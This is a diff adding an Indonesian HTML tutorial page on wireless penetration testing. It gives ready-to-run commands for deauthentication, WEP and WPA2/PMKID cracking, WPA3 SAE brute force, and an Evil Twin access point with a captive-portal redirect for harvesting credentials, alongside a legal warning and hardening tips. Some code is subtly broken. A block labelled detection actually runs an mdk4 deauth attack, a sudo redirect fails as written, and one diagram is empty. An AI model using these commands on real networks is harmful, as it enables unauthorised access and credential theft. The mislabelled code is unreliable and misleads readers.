@@ -1,0 +1,486 @@
+<div class="search-overlay" id="searchOverlay"><button class="search-close-btn" aria-label="Tutup pencarian">&times;</button><div class="search-box"><div class="search-input-wrapper"><input type="text" id="searchInput" placeholder="Cari tutorial..."></div><div class="search-results" id="searchResults"><div class="search-hint">Ketik untuk mencari</div></div></div></div>
+  <section class="article-hero"><div class="container"><div class="breadcrumb"><a href="../index.html">Beranda</a><span class="separator">/</span><a href="../index.html#categories">Keamanan</a><span class="separator">/</span><span class="current">Wireless Penetration Testing</span></div><span class="category-tag">Keamanan</span><h1>Wireless Penetration Testing</h1><p class="article-subtitle">Panduan lengkap wireless penetration testing — reconnaissance, WiFi cracking, Evil Twin, rogue AP, hingga wireless IDS</p><div class="article-meta"><span>📅 29 Juni 2026</span><span>📖 16 menit baca</span><span class="difficulty lanjut">Lanjut</span></div></div></section>
+  <div class="container"><div class="ad-slot ad-slot-wide"></div></div>
+  <article class="article-content" id="main-content"><div class="container">
+    <div class="info-box info"><div class="info-box-title">📋 Daftar Isi</div><ol>
+      <li><a href="#pengenalan">Pengenalan</a></li>
+      <li><a href="#tools">Tools & Setup</a></li>
+      <li><a href="#recon">Reconnaissance</a></li>
+      <li><a href="#wep">WEP Cracking</a></li>
+      <li><a href="#wpa">WPA/WPA2 Cracking</a></li>
+      <li><a href="#wpa3">WPA3 Security</a></li>
+      <li><a href="#evil">Evil Twin</a></li>
+      <li><a href="#defense">Defense & Hardening</a></li>
+      <li><a href="#quiz">Quiz</a></li>
+    </ol></div>
+
+      <h2 id="pengenalan">1. Pengenalan Wireless Penetration Testing</h2>
+      <p><strong>Wireless Penetration Testing</strong> adalah proses evaluasi keamanan jaringan nirkabel untuk mengidentifikasi kerentanan, konfigurasi yang salah, dan potensi eksploitasi. Berbeda dengan wired network, wireless network dapat diakses dari jarak tertentu tanpa koneksi fisik.</p>
+      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div><ul>
+        <li>Wireless security protocols (WEP, WPA, WPA2, WPA3)</li>
+        <li>WiFi reconnaissance dan scanning</li>
+        <li>Password cracking techniques</li>
+        <li>Evil Twin dan rogue AP attacks</li>
+        <li>Wireless IDS/IPS deployment</li>
+        <li>Remediation dan hardening</li>
+      </ul></div>
+      <h3>Wireless Security Protocol Evolution</h3>
+      <table class="net-table"><thead><tr><th>Protocol</th><th>Year</th><th>Encryption</th><th>Status</th></tr></thead><tbody>
+        <tr><td><strong>WEP</strong></td><td>1999</td><td>RC4 (24-bit IV)</td><td>Broken — Jangan digunakan</td></tr>
+        <tr><td><strong>WPA</strong></td><td>2003</td><td>TKIP/RC4</td><td>Deprecated</td></tr>
+        <tr><td><strong>WPA2</strong></td><td>2004</td><td>AES-CCMP</td><td>Standar saat ini</td></tr>
+        <tr><td><strong>WPA3</strong></td><td>2018</td><td>SAE/AES-GCMP</td><td>Rekomendasi</td></tr>
+      </tbody></table>
+      <div class="warning-box"><div class="info-box-title">⚠️ Peringatan Hukum</div>
+        <p>Wireless penetration testing HANYA boleh dilakukan pada jaringan yang Anda miliki atau memiliki izin tertulis. Mengakses jaringan tanpa izin adalah pelanggaran UU ITE Pasal 30-32.</p>
+      </div>
+
+      <h2 id="tools">2. Tools dan Setup</h2>
+      <p>Untuk wireless pentest, Anda memerlukan hardware dan software yang sesuai. Wireless adapter harus mendukung monitor mode dan packet injection.</p>
+      <h3>Hardware Requirements</h3>
+      <ul>
+        <li><strong>Wireless adapter</strong> yang mendukung monitor mode (Alfa AWUS036ACH, AWUS1900)</li>
+        <li><strong>External antenna</strong> omni-directional dan directional</li>
+        <li><strong>Laptop</strong> dengan Kali Linux atau Parrot OS</li>
+      </ul>
+      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Install Wireless Tools</span><button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button></div>
+<pre><code># =============================================
+# Installasi Tools Wireless Pentesting
+# =============================================
+
+# Update system
+sudo apt update && sudo apt upgrade -y
+
+# Install Aircrack-ng suite
+sudo apt install -y aircrack-ng
+
+# Install additional tools
+sudo apt install -y \
+  hostapd dnsmasq reaver wifite bully \
+  pixiewps mdk3 mdk4 hashcat \
+  hcxdumptool hcxpcapngtool \
+  kismet wireshark
+
+# Verifikasi wireless adapter
+iwconfig
+
+# Enable monitor mode
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+
+# Verifikasi monitor mode
+iwconfig wlan0mon
+
+# Cek adapter capabilities
+iw list | grep -A 8 "Supported interface modes"</code></pre>
+      </div>
+
+      <h2 id="recon">3. Wireless Reconnaissance</h2>
+      <p>Reconnaissance adalah langkah pertama. Tujuannya mengidentifikasi semua wireless network, clients, dan konfigurasi dalam range.</p>
+      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WiFi Reconnaissance</span><button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button></div>
+<pre><code># =============================================
+# Wireless Reconnaissance dengan Aircrack-ng
+# =============================================
+
+# 1. Enable monitor mode
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+
+# 2. Scan semua channel (passive)
+sudo airodump-ng wlan0mon \
+  --band abg \
+  --write scan_results \
+  --output-format pcap,csv
+
+# 3. Focus pada target network
+sudo airodump-ng wlan0mon \
+  --bssid AA:BB:CC:DD:EE:FF \
+  --channel 6 \
+  --write target_capture \
+  --output-format pcap,csv
+
+# 4. Capture handshake (dengan deauth)
+sudo aireplay-ng --deauth 10 \
+  -a AA:BB:CC:DD:EE:FF \
+  -c 11:22:33:44:55:66 \
+  wlan0mon
+
+# 5. Verifikasi handshake capture
+aircrack-ng target_capture-01.cap
+
+# =============================================
+# Alternative: Kismet passive scanning
+# =============================================
+
+# Start Kismet server
+sudo kismet -c wlan0mon --override wardrive
+
+# Kismet mendeteksi:
+# - SSID dan BSSID
+# - Channel dan encryption
+# - Client devices
+# - Hidden SSIDs
+# - Rogue access points</code></pre>
+      </div>
+      <h3>Client Enumeration</h3>
+      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Client Discovery</span><button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button></div>
+<pre><code># =============================================
+# Client Enumeration &amp; Analysis
+# =============================================
+
+# List all clients associated with AP
+sudo airodump-ng wlan0mon \
+  --bssid AA:BB:CC:DD:EE:FF \
+  --channel 6 \
+  --station-only
+
+# Probe request analysis (what networks clients look for)
+# Ini mengungkap SSID yang pernah dikunjungi client
+sudo tcpdump -i wlan0mon -e -s 256 \
+  'type mgt subtype probe-req' 2>/dev/null
+
+# Detect hidden SSIDs through probe responses
+sudo tcpdump -i wlan0mon -e -s 256 \
+  'type mgt subtype probe-resp' 2>/dev/null</code></pre>
+      </div>
+
+      <h2 id="wep">4. WEP Cracking</h2>
+      <p>WEP menggunakan enkripsi RC4 dengan IV 24-bit yang sangat lemah. Dapat dipecahkan dalam hitungan menit.</p>
+      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WEP Cracking</span><button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button></div>
+<pre><code># =============================================
+# WEP Cracking Steps
+# =============================================
+
+# Step 1: Enable monitor mode
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+
+# Step 2: Capture IVs
+sudo airodump-ng wlan0mon \
+  --bssid AA:BB:CC:DD:EE:FF \
+  --channel 11 \
+  --write wep_capture \
+  --output-format pcap
+
+# Step 3: Generate traffic (ARP replay)
+sudo aireplay-ng --arpreplay \
+  -b AA:BB:CC:DD:EE:FF \
+  -h YOUR_MAC \
+  wlan0mon
+
+# Step 4: Fake authentication
+sudo aireplay-ng --fakeauth 30 \
+  -a AA:BB:CC:DD:EE:FF \
+  -h YOUR_MAC \
+  wlan0mon
+
+# Step 5: Crack setelah ~20,000+ IVs
+sudo aircrack-ng wep_capture-01.cap
+# Output: KEY FOUND! [ 1A:2B:3C:4D:5E ]
+
+# Alternatif: Fragmentation attack
+sudo aireplay-ng --fragment \
+  -b AA:BB:CC:DD:EE:FF \
+  -h YOUR_MAC \
+  wlan0mon</code></pre>
+      </div>
+      <div class="info-box info"><div class="info-box-title">💡 Catatan</div>
+        <p>WEP cracking membutuhkan minimal 20,000 IVs untuk 64-bit key dan 40,000 IVs untuk 128-bit key. Dengan ARP replay, ini bisa dicapai dalam 5-10 menit. Semua organisasi HARUS beralih ke WPA2/WPA3.</p>
+      </div>
+
+      <h2 id="wpa">5. WPA/WPA2 Cracking</h2>
+      <p>WPA2 menggunakan AES-CCMP yang secara kriptografis kuat. Namun WPA2-PSK rentan dictionary attack jika password lemah.</p>
+      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WPA2 Cracking</span><button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button></div>
+<pre><code># =============================================
+# WPA2-PSK Cracking
+# =============================================
+
+# Step 1: Monitor mode
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+
+# Step 2: Capture handshake
+sudo airodump-ng wlan0mon \
+  --bssid AA:BB:CC:DD:EE:FF \
+  --channel 6 \
+  --write wpa_handshake
+
+# Step 3: Force reconnect (deauth)
+sudo aireplay-ng --deauth 5 \
+  -a AA:BB:CC:DD:EE:FF \
+  wlan0mon
+
+# Step 4: Verify handshake
+aircrack-ng wpa_handshake-01.cap
+
+# Step 5: Dictionary attack
+aircrack-ng wpa_handshake-01.cap \
+  -w /usr/share/wordlists/rockyou.txt \
+  -b AA:BB:CC:DD:EE:FF
+
+# =============================================
+# Hashcat (GPU accelerated)
+# =============================================
+
+# Convert to hashcat format
+hcxpcapngtool wpa_handshake-01.cap \
+  -o wpa_hash.hc22000
+
+# GPU brute force
+hashcat -m 22000 wpa_hash.hc22000 \
+  /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+
+# Mask attack (8 char lowercase + digits)
+hashcat -m 22000 wpa_hash.hc22000 \
+  -a 3 ?l?l?l?l?l?l?d?d
+
+# =============================================
+# PMKID Attack (tanpa client/deauth)
+# =============================================
+
+sudo hcxdumptool -i wlan0mon \
+  --filterlist_ap=target.txt \
+  --filtermode=2 \
+  -o pmkid_capture.pcapng
+
+hcxpcapngtool pmkid_capture.pcapng \
+  -o pmkid_hash.hc22000
+hashcat -m 22000 pmkid_hash.hc22000 \
+  /usr/share/wordlists/rockyou.txt</code></pre>
+      </div>
+
+      <h2 id="wpa3">6. WPA3 Security</h2>
+      <p>WPA3 memperkenalkan <strong>SAE (Simultaneous Authentication of Equals)</strong> yang menggantikan PSK, memberikan perlindungan terhadap offline dictionary attack dan forward secrecy.</p>
+      <h3>WPA3 Improvements</h3>
+      <ul>
+        <li><strong>SAE (Dragonfly)</strong> — Menghilangkan offline dictionary attack</li>
+        <li><strong>Forward Secrecy</strong> — Setiap session menggunakan key unik</li>
+        <li><strong>192-bit Security Suite</strong> — Untuk enterprise/government</li>
+        <li><strong>Protected Management Frames (PMF)</strong> — Wajib di WPA3</li>
+      </ul>
+      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WPA3/SAE Testing</span><button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button></div>
+<pre><code># =============================================
+# WPA3 Dragonblood Attacks (Research)
+# =============================================
+
+# Note: Untuk research dan testing saja
+
+# Install wacker (SAE brute force)
+git clone https://github.com/blunderbuss-wctf/wacker
+cd wacker
+pip3 install -r requirements.txt
+
+# Run SAE brute force
+sudo python3 wacker.py \
+  --wordlist wordlist.txt \
+  --ssid "TargetWiFi" \
+  --bssid AA:BB:CC:DD:EE:FF \
+  --interface wlan0mon
+
+# Dragonblood vulnerabilities:
+# CVE-2019-9494 — SAE cache-based side-channel
+# CVE-2019-9495 — EAP-pwd side-channel
+# CVE-2020-15862 — Transition Disable Attack
+
+# Defense against downgrade:
+# - Enable Protected Management Frames (802.11w)
+# - Disable WPA2/TKIP transition mode
+# - Monitor for deauth attacks
+# - Use WPA3-only mode if possible</code></pre>
+      </div>
+
+      <h2 id="evil">7. Evil Twin &amp; Karma Attack</h2>
+      <p><strong>Evil Twin</strong> adalah serangan di mana attacker membuat AP palsu yang meniru SSID target. Korban terhubung, attacker bisa MITM, credential harvesting, dan captive portal phishing.</p>
+      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Evil Twin Attack</span><button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button></div>
+<pre><code># =============================================
+# Evil Twin Access Point Setup
+# =============================================
+
+# Step 1: hostapd configuration
+cat &gt; hostapd_evil.conf &lt;&lt; 'EOF'
+interface=wlan1
+driver=nl80211
+ssid=FreeWiFi
+hw_mode=g
+channel=6
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=0
+EOF
+
+# Step 2: DHCP configuration (dnsmasq)
+cat &gt; dnsmasq_evil.conf &lt;&lt; 'EOF'
+interface=wlan1
+dhcp-range=192.168.100.10,192.168.100.50,12h
+dhcp-option=3,192.168.100.1
+dhcp-option=6,192.168.100.1
+server=8.8.8.8
+log-queries
+log-dhcp
+EOF
+
+# Step 3: Setup IP and routing
+sudo ifconfig wlan1 192.168.100.1 netmask 255.255.255.0
+sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+
+# Step 4: Start services
+sudo hostapd hostapd_evil.conf &amp;
+sudo dnsmasq -C dnsmasq_evil.conf &amp;
+
+# Step 5: Deauth clients dari AP asli
+sudo aireplay-ng --deauth 0 \
+  -a AA:BB:CC:DD:EE:FF \
+  wlan0mon
+
+# Step 6: Captive portal redirect
+sudo iptables -t nat -A PREROUTING \
+  -i wlan1 -p tcp --dport 80 \
+  -j DNAT --to-destination 192.168.100.1:80</code></pre>
+      </div>
+
+      <h2 id="defense">8. Defense &amp; Hardening</h2>
+      <h3>Common Findings &amp; Remediation</h3>
+      <table class="net-table"><thead><tr><th>Finding</th><th>Severity</th><th>Remediation</th></tr></thead><tbody>
+        <tr><td>WEP encryption</td><td>Critical</td><td>Migrasi ke WPA3/WPA2-AES</td></tr>
+        <tr><td>WPA2 password lemah</td><td>High</td><td>Password 12+ karakter kompleks</td></tr>
+        <tr><td>Rogue AP terdeteksi</td><td>High</td><td>Lokasi dan hapus, implementasi WIDS</td></tr>
+        <tr><td>Open network</td><td>Medium</td><td>Tambah WPA2-Enterprise + 802.1X</td></tr>
+        <tr><td>Tanpa PMF</td><td>Medium</td><td>Enable PMF (802.11w)</td></tr>
+        <tr><td>SSID hidden</td><td>Low</td><td>Tidak efektif, fokus enkripsi kuat</td></tr>
+      </tbody></table>
+      <h3>Wireless Hardening Checklist</h3>
+      <div class="code-block"><div class="code-header"><span class="code-lang">Config — WiFi Hardening</span><button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button></div>
+<pre><code># =============================================
+# Wireless Network Hardening Guide
+# =============================================
+
+# 1. Encryption
+#    - Gunakan WPA3-SAE atau WPA2-AES (CCMP)
+#    - Jangan gunakan WEP atau WPA-TKIP
+#    - Password minimal 12 karakter, kompleks
+
+# 2. Authentication
+#    - Enterprise: WPA2/WPA3-Enterprise + RADIUS
+#    - 802.1X certificate-based auth
+#    - EAP-TLS untuk mutual authentication
+
+# 3. Network Segmentation
+#    - Guest network terpisah dari corporate
+#    - VLAN untuk wireless clients
+#    - Firewall rules antara VLAN
+
+# 4. Management Frame Protection
+#    - Enable 802.11w (PMF) - required
+#    - Protect against deauth/disassoc attacks
+
+# 5. Monitoring
+#    - Deploy WIDS/WIPS
+#    - Monitor rogue AP detection
+#    - Alert on evil twin indicators
+#    - Regular site surveys
+
+# 6. Access Control
+#    - MAC filtering (bukan satu-satunya kontrol)
+#    - RADIUS accounting
+#    - Time-based access policies</code></pre>
+      </div>
+
+      <h3>WPA2 Handshake Analysis</h3>
+      <p>Memahami proses 4-way handshake WPA2 sangat penting untuk wireless security testing. Handshake terjadi saat client terhubung ke access point dan menukar cryptographic keys.</p>
+      <div class="diagram-box"><div class="diagram-label">Diagram: WPA2 4-Way Handshake</div>
+<pre><code>WPA2 4-WAY HANDSHAKE</code></pre>
+      </div>
+      <h3>WiFi Jamming dan DoS</h3>
+      <p>Serangan denial of service pada wireless network dapat dilakukan dengan mengirimkan deauthentication frames secara massal, menyebabkan semua client terputus dari access point.</p>
+      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WiFi DoS Detection</span><button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button></div>
+<pre><code># =============================================
+# WiFi DoS Attack Detection &amp; Monitoring
+# =============================================
+
+# Monitor deauth flood attacks
+sudo airodump-ng wlan0mon --output-format pcap \
+  --write deauth_monitor
+
+# Detect using mdk4
+sudo mdk4 wlan0mon d -c 6
+
+# Monitor with Wireshark filter
+# wlan.fc.type_subtype == 0x000c
+# (Deauthentication frames)
+
+# Counter-measures:
+# 1. Enable 802.11w (Protected Management Frames)
+# 2. Deploy WIDS to detect deauth floods
+# 3. Use frequency hopping if supported
+# 4. Monitor signal strength anomalies
+
+# Script: Automated deauth detection
+#!/bin/bash
+THRESHOLD=50
+INTERFACE="wlan0mon"
+
+while true; do
+    DEAUTH_COUNT=$(tcpdump -i $INTERFACE -c 1000 \
+      'type mgt subtype deauth' 2>/dev/null | wc -l)
+    if [ "$DEAUTH_COUNT" -gt "$THRESHOLD" ]; then
+        echo "[ALERT] Deauth flood detected: $DEAUTH_COUNT frames"
+        # Send alert to SIEM
+        logger -p auth.alert "WiFi deauth flood detected"
+    fi
+    sleep 10
+done</code></pre>
+      </div>
+
+      <h2 id="quiz">9. Quiz Pemahaman</h2>
+      <div class="quiz-container">
+        <div class="quiz-question" data-correct="1">
+          <p><strong>1. Apa kepanjangan SAE dalam WPA3?</strong></p>
+          <label><input type="radio" name="q1" value="0"> Secure Authentication Engine</label>
+          <label><input type="radio" name="q1" value="1"> Simultaneous Authentication of Equals</label>
+          <label><input type="radio" name="q1" value="2"> Standard AES Encryption</label>
+          <label><input type="radio" name="q1" value="3"> Session Auth Element</label>
+        </div>
+        <div class="quiz-question" data-correct="1">
+          <p><strong>2. Tool untuk menangkap 4-way handshake WPA2?</strong></p>
+          <label><input type="radio" name="q2" value="0"> nmap</label>
+          <label><input type="radio" name="q2" value="1"> airodump-ng/aircrack-ng</label>
+          <label><input type="radio" name="q2" value="2"> wireshark</label>
+          <label><input type="radio" name="q2" value="3"> tcpdump</label>
+        </div>
+        <div class="quiz-question" data-correct="2">
+          <p><strong>3. Minimum IVs untuk crack WEP 64-bit?</strong></p>
+          <label><input type="radio" name="q3" value="0"> 1,000</label>
+          <label><input type="radio" name="q3" value="1"> 5,000</label>
+          <label><input type="radio" name="q3" value="2"> 20,000</label>
+          <label><input type="radio" name="q3" value="3"> 100,000</label>
+        </div>
+        <div class="quiz-question" data-correct="1">
+          <p><strong>4. Apa itu Evil Twin attack?</strong></p>
+          <label><input type="radio" name="q4" value="0"> DDoS pada AP</label>
+          <label><input type="radio" name="q4" value="1"> AP palsu yang meniru SSID target</label>
+          <label><input type="radio" name="q4" value="2"> Brute force password</label>
+          <label><input type="radio" name="q4" value="3"> Menginfeksi firmware</label>
+        </div>
+        <div class="quiz-question" data-correct="1">
+          <p><strong>5. Mode untuk packet sniffing pada wireless adapter?</strong></p>
+          <label><input type="radio" name="q5" value="0"> Promiscuous mode</label>
+          <label><input type="radio" name="q5" value="1"> Monitor mode</label>
+          <label><input type="radio" name="q5" value="2"> Managed mode</label>
+          <label><input type="radio" name="q5" value="3"> Ad-hoc mode</label>
+        </div>
+        <button class="quiz-submit" aria-label="Periksa jawaban kuis" onclick="checkQuiz(this)">Periksa Jawaban</button>
+        <div class="quiz-result"></div>
+      </div>
+      <h3>Rangkuman</h3>
+      <div class="info-box info"><div class="info-box-title">📝 Poin Penting</div><ul>
+        <li><strong>WEP</strong> — Sudah rusak, harus segera diganti ke WPA2/WPA3</li>
+        <li><strong>WPA2-PSK</strong> — Rentan dictionary attack jika password lemah</li>
+        <li><strong>WPA3</strong> — SAE mencegah offline dictionary attack</li>
+        <li><strong>Evil Twin</strong> — AP palsu sangat berbahaya, perlu WIDS</li>
+        <li><strong>Legal</strong> — Selalu miliki izin tertulis sebelum testing</li>
+      </ul></div>
+  </div></article>
+  <script src="../js/app.js?v=19.2"></script>
+<script>if('serviceWorker' in navigator){window.addEventListener('load',()=>{navigator.serviceWorker.register('/sw.js').catch(()=>{})})}</script>
